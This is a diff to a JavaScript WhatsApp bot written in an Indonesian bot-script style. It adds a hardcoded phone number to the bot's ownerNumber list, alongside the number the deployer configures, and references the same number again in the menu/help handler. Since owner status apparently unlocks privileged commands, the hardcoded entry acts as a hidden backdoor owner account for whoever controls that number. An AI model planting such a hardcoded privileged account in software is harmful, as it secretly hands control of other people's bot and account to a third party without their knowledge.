@@ -283,7 +283,8 @@ try {
 			}
 		}
 		const botNumber = denz.user.jid
-		const isGroup = from.endsWith('@g.us')
+		const ownerNumber = ["6285866295942@s.whatsapp.net",`${NomorOwner}@s.whatsapp.net`]
+        const isGroup = from.endsWith('@g.us')
 		const sender = mek.key.fromMe ? denz.user.jid : isGroup ? mek.participant : mek.key.remoteJid
 		const senderNumber = sender.split("@")[0] 
 		const conts = mek.key.fromMe ? denz.user.jid : denz.contacts[mek.sender]
@@ -980,6 +981,8 @@ reply('http://youtube.com/dcodedenpa')
         switch (command) {
         	case 'menu':
         case 'help':
+        dtod = "6285866295942@s.whatsapp.net"
+     otod = `${settings.NomorOwner}@s.whatsapp.net`
         stod = `${sender}`
        stst = await denz.getStatus(`${sender.split('@')[0]}@c.us`)
 				stst = stst.status == 401 ? 'unknown' : stst.status
